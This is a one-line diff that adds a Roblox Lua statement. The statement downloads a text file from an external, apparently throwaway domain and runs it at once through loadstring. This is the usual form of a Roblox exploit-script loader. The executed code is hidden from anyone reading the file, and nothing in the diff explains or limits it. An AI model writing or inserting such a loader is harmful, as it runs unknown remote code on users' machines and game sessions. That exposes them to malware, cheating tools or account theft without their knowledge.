@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://encrypts.gq/cYYXaN2LBq.txt", true))()
